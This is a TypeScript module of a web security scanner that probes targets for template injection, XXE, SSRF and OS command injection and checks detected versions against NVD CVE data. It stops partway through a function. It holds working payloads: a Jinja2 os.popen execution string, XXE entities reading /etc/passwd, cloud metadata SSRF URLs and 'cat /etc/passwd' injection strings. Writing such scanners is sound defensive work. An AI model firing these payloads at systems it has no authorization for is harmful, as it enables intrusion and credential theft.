/**
 * Advanced Vulnerability Probes
 *
 * Non-destructive, evidence-gathering checks for:
 *   • SSTI  — Server-Side Template Injection (Jinja2, Twig, Freemarker, EL, ERB, Spring)
 *   • XXE   — XML External Entity injection via content-type probing
 *   • SSRF  — Server-Side Request Forgery via redirect parameters
 *   • Deser — Deserialization endpoint detection
 *   • CVE   — NVD API cross-reference for detected technology versions
 */

import {
  activeProbesAllowed,
  getScanAuthHeaders,
  isContextualReflection,
  isWafChallengeResponse,
  noteWafChallengeDetected,
  reserveScanRequest,
  type RealFinding,
} from "./scanner";
import type { Target, LogFn } from "./scanner";

const ts = () => new Date().toISOString();

async function probe(
  url: string,
  opts: { method?: string; headers?: Record<string, string>; body?: string; timeoutMs?: number; followRedirects?: boolean } = {},
): Promise<{ status: number; headers: Record<string, string>; body: string } | null> {
  if (!activeProbesAllowed()) return null;
  if (!reserveScanRequest()) return null;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), opts.timeoutMs ?? 10_000);
  try {
    const res = await fetch(url, {
      method: opts.method ?? "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SentinelX/2.0; security-scanner)",
        ...getScanAuthHeaders(),
        ...(opts.headers ?? {}),
      },
      body: opts.body,
      signal: controller.signal,
      redirect: opts.followRedirects === false ? "manual" : "follow",
    });
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    let body = "";
    try { body = await res.text(); } catch { /* ignore */ }
    if (isWafChallengeResponse(res.status, headers)) {
      await noteWafChallengeDetected();
      return null;
    }
    return { status: res.status, headers, body: body.slice(0, 15_000) };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSTI — Server-Side Template Injection (hardened, false-positive resistant)
// ═══════════════════════════════════════════════════════════════════════════════

const SSTI_PAYLOADS: { payload: string; math: string; result: string; confirmResult: string; engine: string }[] = [
  { payload: "{{7*7}}",            math: "7*7",  result: "49",   confirmResult: "64",   engine: "Jinja2 / Twig" },
  { payload: "${7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Freemarker / EL" },
  { payload: "<%= 7*7 %>",         math: "7*7",  result: "49",   confirmResult: "64",   engine: "ERB (Ruby)" },
  { payload: "#{7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Ruby / Mako" },
  { payload: "*{7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Spring Expression Language" },
  { payload: "${7+7}",             math: "7+7",  result: "14",   confirmResult: "16",   engine: "EL / Thymeleaf" },
  { payload: "{{7+7}}",            math: "7+7",  result: "14",   confirmResult: "16",   engine: "Jinja2 / Handlebars" },
];

const SSTI_TEST_PARAMS = [
  "q", "search", "query", "name", "input", "template", "msg", "message",
  "text", "content", "title", "value", "data", "label", "subject",
  "error", "info", "desc", "description", "body", "page", "view",
];

/** Strip ephemeral tokens from response body to prevent false positives. */
function stripEphemeralTokens(body: string): string {
  return body
    .replace(/[a-f0-9]{16,}-[A-Z]{3}/g, "")           // Cloudflare Ray IDs
    .replace(/__cf_bm=[^;,\s"']*/g, "")                 // __cf_bm cookies
    .replace(/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z/g, ""); // ISO timestamps
}

/** Find all positions of needle in haystack. */
function findAllPositions(haystack: string, needle: string): number[] {
  const positions: number[] = [];
  let idx = 0;
  while ((idx = haystack.indexOf(needle, idx)) !== -1) {
    positions.push(idx);
    idx += needle.length;
  }
  return positions;
}

/** Check if `value` appears within WINDOW chars of any position in `positions`. */
function nearAny(body: string, positions: number[], value: string, window = 200): boolean {
  for (const pos of positions) {
    const start = Math.max(0, pos - window);
    const end = Math.min(body.length, pos + window);
    if (body.slice(start, end).includes(value)) return true;
  }
  return false;
}

export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Server-Side Template Injection (SSTI)...`);
  const rceCanary = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;

  for (const param of SSTI_TEST_PARAMS.slice(0, 8)) {
    for (const { payload, result, confirmResult, engine, math } of SSTI_PAYLOADS) {
      const baselineUrl = `${target.url.replace(/\/$/, "")}?${param}=sentinelx-baseline`;
      const testUrl    = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;

      const baseline = await probe(baselineUrl, { timeoutMs: 8_000 });
      // Skip this parameter entirely if the baseline itself is WAF/rate-limited
      if (!baseline) continue;
      if (
        baseline.status === 429 ||
        (baseline.status === 403 &&
          (baseline.headers["cf-mitigated"] ||
           (baseline.headers["server"] ?? "").toLowerCase().includes("cloudflare") ||
           (baseline.body ?? "").includes("cf-challenge") ||
           (baseline.body ?? "").includes("__cf_bm") ||
           (baseline.body ?? "").includes("Cloudflare Ray ID")))
      ) {
        await onLog(`[${ts()}] SSTI: WAF/rate-limit on param '${param}' (${baseline.status}) — skipping`);
        break; // skip remaining payloads for this param
      }
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      // Also skip if the probe response itself is rate-limited or WAF-blocked
      if (
        r.status === 429 ||
        (r.status === 403 &&
          (r.headers["cf-mitigated"] ||
           (r.headers["server"] ?? "").toLowerCase().includes("cloudflare") ||
           (r.body ?? "").includes("cf-challenge") ||
           (r.body ?? "").includes("__cf_bm") ||
           (r.body ?? "").includes("Cloudflare Ray ID")))
      ) {
        await onLog(`[${ts()}] SSTI: WAF/rate-limit on probe response for param '${param}' (${r.status}) — skipping`);
        break;
      }

      const cleanBaseline = stripEphemeralTokens(baseline?.body ?? "");
      const cleanBody     = stripEphemeralTokens(r.body);

      // ── Step 1: Reflection gate ───────────────────────────────────────────
      // If the raw payload appears in the response the engine didn't evaluate it.
      const payloadReflected = isContextualReflection(cleanBody, payload) ||
                               isContextualReflection(cleanBody, encodeURIComponent(payload));
      if (payloadReflected) continue; // engine reflected, not evaluated

      // ── Step 2: Math result must be present ───────────────────────────────
      if (!cleanBody.includes(result)) continue;
      if (cleanBaseline.includes(result)) continue; // baseline already has it

      // ── Step 3: Unique canary (SENTINELX_SSTI_CONFIRM) ───────────────────
      const sstiCanaryPayload = payload.startsWith("{{")
        ? `{{'SENTINELX_SSTI_' + 'CONFIRM'}}`
        : payload.startsWith("${")
        ? `\${'SENTINELX_SSTI_' + 'CONFIRM'}`
        : payload.startsWith("<%=")
        ? `<%= 'SENTINELX_SSTI_' + 'CONFIRM' %>`
        : `{{'SENTINELX_SSTI_' + 'CONFIRM'}}`;

      const canaryUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(sstiCanaryPayload)}`;
      const canaryR   = await probe(canaryUrl, { timeoutMs: 8_000 });
      const canaryHit = canaryR !== null &&
                        canaryR.body.includes("SENTINELX_SSTI_CONFIRM") &&
                        !cleanBaseline.includes("SENTINELX_SSTI_CONFIRM");

      // ── Step 4: Multi-expression confirmation (8*8 = 64) ─────────────────
      const confirmPayload = payload.replace(/7\*7/g, "8*8").replace(/7\+7/g, "8+8");
      let mathDoublePass = false;
      if (confirmPayload !== payload) {
        const confirmUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(confirmPayload)}`;
        const confirmR   = await probe(confirmUrl, { timeoutMs: 8_000 });
        if (confirmR) {
          const cleanConfirm = stripEphemeralTokens(confirmR.body);
          mathDoublePass = cleanConfirm.includes(confirmResult) && !cleanConfirm.includes(result);
        }
      }

       // ── Step 5: Proximity matching as fallback ───────────────────────────
       // The template payload must be present in the response context. Looking
       // for the result near another copy of the result is tautological and
       // caused CDN/Ray-ID numbers to become SSTI signals.
       const payloadPositions = [
         ...findAllPositions(cleanBody, payload),
         ...findAllPositions(cleanBody, decodeURIComponent(payload)),
       ];
       const nearPayloadRef = payloadPositions.length > 0 &&
         nearAny(cleanBody, payloadPositions, result, 200);

      // ── Verdict ───────────────────────────────────────────────────────────
       const verified = canaryHit || mathDoublePass;
       const suspected = !verified && nearPayloadRef && !cleanBaseline.includes(result);

      if (!activeProbesAllowed() || (!verified && !suspected)) continue;

      const checksPassedParts: string[] = [];
      if (canaryHit)       checksPassedParts.push("unique-canary (SENTINELX_SSTI_CONFIRM)");
      if (mathDoublePass)  checksPassedParts.push("dual-math (7*7=49, 8*8=64)");
      if (nearPayloadRef)  checksPassedParts.push("proximity-matching");

      findings.push({
        title: `SSTI — Server-Side Template Injection (${engine})`,
        severity: verified ? "high" : "medium",
        verification: verified ? "verified" : "suspected",
        confidence: verified ? 95 : 55,
        cvss: verified ? 8.7 : 5.3,
        cve: null,
        description: `Server-Side Template Injection ${verified ? "verified" : "suspected"} in parameter '${param}'. A template expression (${math}) evaluated to ${result}; ${checksPassedParts.join(", ")} passed. ${verified ? "Confirmed server-side expression evaluation." : "Low-confidence signal — confirm manually."}`,
        evidence: `BASELINE: GET ${baselineUrl}\nTEST:     GET ${testUrl}\nPAYLOAD:  ${param}=${payload}\nEXPECTED: expression evaluates to "${result}"\nRESPONSE: HTTP ${r.status}\nCHECKS PASSED: ${checksPassedParts.join(", ")}\nTEMPLATE ENGINE: ${engine}\n${canaryHit ? "CANARY: SENTINELX_SSTI_CONFIRM found in canary response" : ""}`,
        remediation: `1. Never pass user input into template render() calls.\n2. Use a template sandbox (Jinja2 SandboxedEnvironment).\n3. Escape untrusted values before rendering.\n4. Disable dynamic evaluation in production.\n5. Run the web server as a least-privilege user.`,
      });
      await onLog(`[${ts()}] ⚠ SSTI ${verified ? "VERIFIED" : "SUSPECTED"}: ${engine} via param '${param}' — ${checksPassedParts.join(", ")}`);

      // RCE canary attempt
      if (verified) {
        const rcePayload = engine.includes("Jinja2") || engine.includes("Twig")
          ? `{{ cycler.__init__.__globals__.os.popen('printf ${rceCanary}').read() }}`
          : engine.includes("ERB")
          ? `<%= \`printf ${rceCanary}\` %>`
          : null;
        if (rcePayload) {
          const rceUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(rcePayload)}`;
          const rceResponse = await probe(rceUrl, { timeoutMs: 8_000 });
          if (rceResponse?.body.includes(rceCanary) && !rceResponse.body.includes(rcePayload)) {
            findings.push({
              title: `RCE canary executed via SSTI (${engine})`,
              severity: "critical",
              verification: "verified",
              confidence: 98,
              cvss: 10.0,
              cve: null,
              description: `A bounded, non-destructive command canary was returned by the server after the SSTI expression was submitted. This verifies operating-system command execution in the template context; no data-modifying command was used.`,
              evidence: `REQUEST: GET ${rceUrl}\nCANARY: ${rceCanary}\nRESPONSE: HTTP ${rceResponse.status} contained the unique canary and did not reflect the payload\nRCE STATUS: VERIFIED`,
              remediation: "Remove the template injection sink immediately, invalidate exposed credentials, rotate sessions, review server-side logs, and isolate the affected workload. Do not rely on filtering alone; use a sandbox and least-privilege execution.",
            });
            await onLog(`[${ts()}] ⚠ RCE CANARY VERIFIED: ${engine} via param '${param}'`);
          } else {
            await onLog(`[${ts()}] SSTI confirmed but RCE canary was not observed`);
          }
        }
        return findings;
      }
      break; // one suspected finding per param is enough
    }
  }

  await onLog(`[${ts()}] SSTI: no evaluation detected`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// XXE — XML External Entity
// ═══════════════════════════════════════════════════════════════════════════════

const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
];

const XXE_INDICATORS = [
  "root:", "daemon:", "/bin/bash", "/bin/sh", // /etc/passwd
  "nobody:", "www-data:", // common linux users
];

export async function checkXXE(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing XXE (XML External Entity) injection...`);

  const xmlEndpoints = [
    target.url,
    `${target.url.replace(/\/$/, "")}/api`,
    `${target.url.replace(/\/$/, "")}/upload`,
    `${target.url.replace(/\/$/, "")}/xml`,
    `${target.url.replace(/\/$/, "")}/soap`,
    `${target.url.replace(/\/$/, "")}/service`,
  ];

  for (const ep of xmlEndpoints.slice(0, 3)) {
    for (const payload of XXE_PAYLOADS) {
      const r = await probe(ep, {
        method: "POST",
        headers: { "Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*" },
        body: payload,
        timeoutMs: 8_000,
      });
      if (!r) continue;

      const indicator = XXE_INDICATORS.find(ind => r.body.includes(ind));
      if (indicator) {
        findings.push({
          title: "XXE — XML External Entity Injection (File Read Confirmed)",
          severity: "critical",
          verification: "verified",
          confidence: 99,
          cvss: 9.1,
          cve: null,
          description: `XXE injection confirmed at ${ep}. The server processed a malicious XML payload referencing an external entity pointing to /etc/passwd. The response body contained system file content ("${indicator}"). This allows reading arbitrary files (including /etc/shadow, SSH keys, application configs), internal SSRF, and potentially remote code execution via expect:// URI handler.`,
          evidence: `REQUEST:\n  POST ${ep}\n  Content-Type: application/xml\n  Body: ${payload.slice(0, 200)}...\n\nRESPONSE:\n  HTTP ${r.status}\n  Body contains: "${indicator}" (from /etc/passwd)\n  Snippet: ${r.body.slice(0, 400)}`,
          remediation: "1. Disable external entity processing in your XML parser (highest priority).\n2. Java: factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n3. PHP: libxml_disable_entity_loader(true) (deprecated) or use DOMDocument with LIBXML_NONET\n4. Python: use defusedxml instead of lxml/ElementTree\n5. Validate and whitelist XML schemas (XSD) before processing.\n6. Apply Content-Type validation — reject application/xml if not needed.",
        });
        await onLog(`[${ts()}] ⚠ XXE CONFIRMED at ${ep} — file read via external entity`);
        return findings;
      }

      // Blind XXE indicator: longer response time or error messages
      if (r.body.toLowerCase().includes("entity") && r.body.toLowerCase().includes("denied")) {
        findings.push({
          title: "Possible Blind XXE — XML Entity Processing Detected",
          severity: "medium",
          verification: "suspected",
          confidence: 45,
          cvss: 5.3,
          cve: null,
          description: `The server processed the XML body and returned an error referencing entity resolution, suggesting the XML parser attempted to resolve external entities before blocking them. Blind XXE may allow SSRF or out-of-band file exfiltration.`,
          evidence: `POST ${ep}\nContent-Type: application/xml\nResponse indicated entity processing: ${r.body.slice(0, 300)}`,
          remediation: "Disable DTD processing and external entity resolution in your XML parser. Do not rely on error-based blocking alone.",
        });
        break;
      }
    }
  }

  await onLog(`[${ts()}] XXE: no file read confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSRF — Server-Side Request Forgery (blind, via DNS/HTTP pingback indicators)
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkSSRF(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing SSRF (Server-Side Request Forgery) indicators...`);

  // Check internal metadata service access via redirect parameters
  const metadataUrls = [
    "http://169.254.169.254/latest/meta-data/",  // AWS IMDSv1
    "http://metadata.google.internal/computeMetadata/v1/",  // GCP
    "http://169.254.169.254/metadata/instance",  // Azure
    "http://100.100.100.200/latest/meta-data/",  // Alibaba Cloud
  ];

  const ssrfParams = ["url", "fetch", "proxy", "redirect", "image", "src", "href", "link", "file", "path", "load", "host"];

  for (const param of ssrfParams.slice(0, 5)) {
    for (const metaUrl of metadataUrls.slice(0, 2)) {
      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(metaUrl)}`;
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;

      // AWS metadata indicators
      if (r.body.includes("ami-") || r.body.includes("instance-id") || r.body.includes("iam/security-credentials")) {
        findings.push({
          title: "SSRF — AWS Metadata Service Accessible (IMDSv1 Exposed)",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `Server-Side Request Forgery confirmed: the server fetched the AWS EC2 Instance Metadata Service (IMDS) in response to parameter '${param}'. The response contains AWS metadata. This can expose IAM credentials, allowing full AWS account compromise.`,
          evidence: `GET ${testUrl}\nParameter: ${param}=${metaUrl}\nHTTP ${r.status} response contains AWS metadata indicators:\n${r.body.slice(0, 500)}`,
          remediation: "1. Block server-side requests to link-local (169.254.x.x) and metadata IP ranges.\n2. Migrate to IMDSv2 (requires session token — prevents SSRF exploitation).\n3. Validate and allowlist URL parameters that trigger server-side HTTP requests.\n4. Implement egress firewall rules to block access to internal IP ranges from the web server.",
        });
        await onLog(`[${ts()}] ⚠ SSRF CONFIRMED — AWS IMDS accessible via param '${param}'`);
        return findings;
      }

      // GCP metadata indicators
      if (r.body.includes("project-id") || r.body.includes("computeMetadata") || r.body.includes("serviceAccounts")) {
        findings.push({
          title: "SSRF — GCP Metadata Service Accessible",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `SSRF confirmed: GCP Compute Metadata Service accessed via parameter '${param}'. GCP metadata can expose OAuth tokens and service account credentials.`,
          evidence: `GET ${testUrl}\nHTTP ${r.status} response contains GCP metadata:\n${r.body.slice(0, 500)}`,
          remediation: "Block requests to metadata IP ranges (169.254.169.254, metadata.google.internal). Validate all URL-fetching parameters.",
        });
        return findings;
      }
    }
  }

  await onLog(`[${ts()}] SSRF: no metadata service access confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CVE Lookup — NVD API (free, no key required)
// ═══════════════════════════════════════════════════════════════════════════════

interface NvdCve {
  id: string;
  description: string;
  cvssScore: number;
  severity: string;
  published: string;
  cpeMatches: Array<{
    criteria: string;
    vulnerable: boolean;
    versionStartIncluding?: string;
    versionStartExcluding?: string;
    versionEndIncluding?: string;
    versionEndExcluding?: string;
  }>;
}

async function queryNvd(keyword: string): Promise<NvdCve[]> {
  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5&cvssV3Severity=HIGH,CRITICAL`;
    const r = await probe(url, { timeoutMs: 15_000 });
    if (!r || r.status !== 200) return [];

    const data = JSON.parse(r.body);
    const vulnerabilities: NvdCve[] = [];

    for (const item of (data.vulnerabilities ?? []).slice(0, 20)) {
      const cve = item.cve;
      const desc = cve?.descriptions?.find((d: any) => d.lang === "en")?.value ?? "";
      const metrics = cve?.metrics?.cvssMetricV31?.[0] ?? cve?.metrics?.cvssMetricV30?.[0] ?? cve?.metrics?.cvssMetricV2?.[0];
      const score = metrics?.cvssData?.baseScore ?? 0;
      const sev = metrics?.cvssData?.baseSeverity ?? "UNKNOWN";

      if (score >= 7.0) {
        const cpeMatches = (cve?.configurations ?? []).flatMap((configuration: any) =>
          (configuration.nodes ?? []).flatMap((node: any) =>
            (node.cpeMatch ?? []).map((match: any) => ({
              criteria: String(match.criteria ?? ""),
              vulnerable: match.vulnerable !== false,
              versionStartIncluding: match.versionStartIncluding,
              versionStartExcluding: match.versionStartExcluding,
              versionEndIncluding: match.versionEndIncluding,
              versionEndExcluding: match.versionEndExcluding,
            })),
          ),
        );
        vulnerabilities.push({
          id: cve.id,
          description: desc.slice(0, 300),
          cvssScore: score,
          severity: sev,
          published: cve.published?.slice(0, 10) ?? "",
          cpeMatches,
        });
      }
    }
    return vulnerabilities;
  } catch {
    return [];
  }
}

interface TechProfile { name: string; version?: string; category: string; }

function versionParts(version: string): number[] | null {
  const match = version.trim().match(/^\d+(?:\.\d+){0,3}/);
  if (!match) return null;
  return match[0].split(".").map(Number);
}

function compareVersions(left: string, right: string): number | null {
  const a = versionParts(left);
  const b = versionParts(right);
  if (!a || !b) return null;
  for (let i = 0; i < Math.max(a.length, b.length); i++) {
    const delta = (a[i] ?? 0) - (b[i] ?? 0);
    if (delta !== 0) return delta > 0 ? 1 : -1;
  }
  return 0;
}

function cpeAppliesToExactVersion(cpe: NvdCve["cpeMatches"][number], version: string): boolean {
  if (!cpe.vulnerable) return false;
  const cpeVersion = cpe.criteria.split(":")[5];
  if (cpeVersion && cpeVersion !== "*" && cpeVersion !== "-" && cpeVersion !== version) return false;
  const startIncluding = cpe.versionStartIncluding ? compareVersions(version, cpe.versionStartIncluding) : null;
  const startExcluding = cpe.versionStartExcluding ? compareVersions(version, cpe.versionStartExcluding) : null;
  const endIncluding = cpe.versionEndIncluding ? compareVersions(version, cpe.versionEndIncluding) : null;
  const endExcluding = cpe.versionEndExcluding ? compareVersions(version, cpe.versionEndExcluding) : null;
  if (startIncluding !== null && startIncluding < 0) return false;
  if (startExcluding !== null && startExcluding <= 0) return false;
  if (endIncluding !== null && endIncluding > 0) return false;
  if (endExcluding !== null && endExcluding >= 0) return false;
  return true;
}

function cpeMatchesTechnology(cpe: NvdCve["cpeMatches"][number], tech: TechProfile): boolean {
  const name = tech.name.toLowerCase();
  const product = cpe.criteria.split(":")[4]?.toLowerCase() ?? "";
  const aliases = name.includes("nginx") ? ["nginx"] :
    name.includes("apache") ? ["apache", "http_server"] :
    name.includes("wordpress") ? ["wordpress"] :
    name.includes("drupal") ? ["drupal"] :
    name.includes("joomla") ? ["joomla"] : [];
  return aliases.some((alias) => product.includes(alias) || cpe.criteria.toLowerCase().includes(`:${alias}:`));
}

export async function lookupCvesForTechs(techs: TechProfile[], onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (techs.length === 0) return findings;

  await onLog(`[${ts()}] Cross-referencing detected technologies against NVD CVE database...`);

  // Deduplicate and pick tech with version info first
  // Never turn a product-only or header-only match into a CVE finding. A CVE
  // is only actionable here when a concrete version was observed.
  const searchable = techs.filter(t => t.version && versionParts(t.version) !== null).slice(0, 4);

  for (const tech of searchable) {
    const query = tech.version ? `${tech.name} ${tech.version}` : tech.name;
    await onLog(`[${ts()}] NVD lookup: "${query}"...`);
    const cves = await queryNvd(query);

    const applicable = cves.filter((cve) =>
      cve.cpeMatches.some((cpe) => cpeMatchesTechnology(cpe, tech) && cpeAppliesToExactVersion(cpe, tech.version!)),
    );

    if (applicable.length > 0) {
      const topCve = applicable[0]!;
      const allCveIds = applicable.map(c => c.id).join(", ");
      findings.push({
        title: `CVE match verified for ${tech.name} ${tech.version} — ${topCve.id}`,
        severity: topCve.cvssScore >= 9.0 ? "critical" : topCve.cvssScore >= 7.0 ? "high" : "medium",
        verification: "version_match",
        confidence: 88,
        cvss: topCve.cvssScore,
        cve: topCve.id,
        description: `NVD returned ${applicable.length} high/critical CVE(s) whose vulnerable CPE ranges include the observed ${tech.name} ${tech.version}. This is a version match, not proof that the target is exploitable; confirm vendor configuration, patch state, and the CVE's required preconditions.`,
        evidence: `Observed technology: ${tech.name} ${tech.version}\nNVD query: "${query}"\nCPE applicability: vulnerable product/version range matched\nApplicable CVEs: ${allCveIds}\nVERIFICATION: VERSION MATCH ONLY — exploitability not tested\n\nTop CVE — ${topCve.id} (CVSS ${topCve.cvssScore} ${topCve.severity}):\n${topCve.description}\nPublished: ${topCve.published}\n\nFull details: https://nvd.nist.gov/vuln/detail/${topCve.id}`,
        remediation: `Update ${tech.name} to the latest stable version immediately. Check https://nvd.nist.gov/vuln/search for all known vulnerabilities. Subscribe to the vendor's security advisory list. Apply vendor patches within your SLA window (critical = 24h, high = 7 days).`,
      });
      await onLog(`[${ts()}] CVE match verified by CPE: ${tech.name} ${tech.version} — ${allCveIds}`);
    } else {
      await onLog(`[${ts()}] NVD: no exact vulnerable CPE match for "${query}"`);
    }

    // Respect NVD rate limit (5 req / 30s without API key)
    await new Promise(r => setTimeout(r, 700));
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RCE via Deserialization — detect known deserialization endpoints
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// COMMAND INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkCommandInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing OS command injection (deep probe)...`);

  const canary = `sentinelx-cmd-${Math.random().toString(36).slice(2, 10)}`;
  const PAYLOADS = [
    { p: `; printf ${canary}`,        shell: "sh" },
    { p: `| printf ${canary}`,        shell: "sh" },
    { p: `$(printf ${canary})`,       shell: "bash" },
    { p: `\`printf ${canary}\``,      shell: "bash" },
    { p: `& echo ${canary}`,          shell: "cmd" },
    { p: `| echo ${canary}`,          shell: "cmd" },
    { p: `\n/bin/echo ${canary}`,     shell: "sh-newline" },
    { p: `%0a/bin/echo ${canary}`,    shell: "sh-encoded" },
  ];
  const PARAMS = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "target", "file", "path", "name", "url", "q", "search", "addr"];

  for (const param of PARAMS.slice(0, 8)) {
    for (const { p, shell } of PAYLOADS.slice(0, 4)) {
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(p)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      if (r.body.includes(canary)) {
        findings.push({
          title: `OS Command Injection Confirmed via '${param}' (${shell})`,
          severity: "critical",
          verification: "verified",
          confidence: 99,
          cvss: 10.0,
          cve: null,
          description: `Operating-system command injection confirmed via the '${param}' parameter using a ${shell} payload. A unique canary string was executed and returned in the response, confirming arbitrary code execution on the server.`,
          evidence: `PROBE: GET ${probeUrl}\nPARAM: ${param}=${p}\nCANARY: ${canary}\nHTTP ${r.status} — canary found in response body\nResponse snippet: ${r.body.slice(0, 400)}`,
          remediation: "Never pass user input to shell/exec functions. Use language-native libraries instead of shell commands. If shell is unavoidable, use an allowlist and properly escape/quote all arguments using shell-escape libraries.",
        });
        await onLog(`[${ts()}] ⚠ COMMAND INJECTION CONFIRMED via '${param}' — canary executed`);
        return findings;
      }
    }
  }

  // POST-based command injection
  const postPayloads = PAYLOADS.slice(0, 3).map(p => p.p);
  for (const payload of postPayloads) {
    const r = await probe(target.url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd: payload, command: payload, exec: payload }),
      timeoutMs: 8_000,
    });
    if (r?.body.includes(canary)) {
      findings.push({
        title: "OS Command Injection via POST Body (JSON)",
        severity: "critical",
        verification: "verified",
        confidence: 99,
        cvss: 10.0,
        cve: null,
        description: "Command injection confirmed via JSON POST body. The server executed a command from user-supplied JSON input and returned the canary string in the response.",
        evidence: `POST ${target.url}\nContent-Type: application/json\nBody: {cmd: "${payload}"}\nHTTP ${r.status}\nCanary found: ${canary}`,
        remediation: "Never pass user input from any source (URL params, JSON body, headers) to shell execution functions. Sanitise and validate all command arguments.",
      });
      await onLog(`[${ts()}] ⚠ COMMAND INJECTION CONFIRMED via POST JSON body`);
      return findings;
    }
  }

  await onLog(`[${ts()}] Command injection: no canary execution confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 27 — ENHANCED COMMAND INJECTION (CANARY + FILE READ EXPLOITATION)
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Enhanced Phase 27 command injection probe. After confirming a canary string
 * executes, it additionally attempts to read /etc/passwd (Linux) or
 * c:\windows\win.ini (Windows) to verify exploitability and include file
 * content as evidence. The canary itself uses `printf` (no newline noise) so
 * it is safe and non-destructive.
 */
export async function checkCommandInjectionDeep(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 27] Enhanced command injection — canary execution + file-read...`);

  const SENTINELX_CMDI_CANARY = `SENTINELX_CMDI_CANARY_${Math.random().toString(36).slice(2, 8).toUpperCase()}`;

  const CANARY_PAYLOADS: { p: string; shell: string }[] = [
    { p: `; echo ${SENTINELX_CMDI_CANARY}`,           shell: "sh" },
    { p: `| echo ${SENTINELX_CMDI_CANARY}`,           shell: "sh-pipe" },
    { p: `$(echo ${SENTINELX_CMDI_CANARY})`,          shell: "bash-subshell" },
    { p: `\`echo ${SENTINELX_CMDI_CANARY}\``,         shell: "bash-backtick" },
    { p: `%0aecho%20${SENTINELX_CMDI_CANARY}`,        shell: "sh-encoded" },
    { p: `& echo ${SENTINELX_CMDI_CANARY}`,           shell: "cmd" },
    { p: `\n/bin/echo ${SENTINELX_CMDI_CANARY}`,      shell: "sh-newline" },
  ];

  const FILE_READ_PAYLOADS: { p: string; os: string; indicator: string }[] = [
    { p: "; cat /etc/passwd",           os: "Linux",   indicator: "root:" },
    { p: "| cat /etc/passwd",           os: "Linux",   indicator: "root:" },
    { p: "$(cat /etc/passwd)",          os: "Linux",   indicator: "root:" },
    { p: "; type c:\\windows\\win.ini", os: "Windows", indicator: "[fonts]" },
    { p: "& type c:\\windows\\win.ini", os: "Windows", indicator: "[fonts]" },
  ];

  const PARAMS = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "target", "file", "path", "name", "url", "q", "search", "addr"];

  for (const param of PARAMS.slice(0, 8)) {
    let confirmedParam: string | null = null;
    let confirmedPayload: string | null = null;
    let confirmedShell: string | null = null;

    // Step 1: Confirm canary execution
    for (const { p, shell } of CANARY_PAYLOADS.slice(0, 5)) {
      if (!activeProbesAllowed()) break;
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(p)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      // Skip if WAF/rate-limited
      if (r.status === 429 || (r.status === 403 && (r.headers["cf-mitigated"] || r.headers["server"]?.includes("cloudflare")))) {
        await onLog(`[${ts()}] [Phase 27] WAF/rate-limit on param '${param}' — skipping`);
        break;
      }
      if (r.body.includes(SENTINELX_CMDI_CANARY)) {
        confirmedParam   = param;
        confirmedPayload = p;
        confirmedShell   = shell;
        findings.push({
          title: `Remote Code Execution via Command Injection — SENTINELX_CMDI_CANARY Executed (${shell})`,
          severity: "critical",
          verification: "verified",
          confidence: 99,
          cvss: 10.0,
          cve: null,
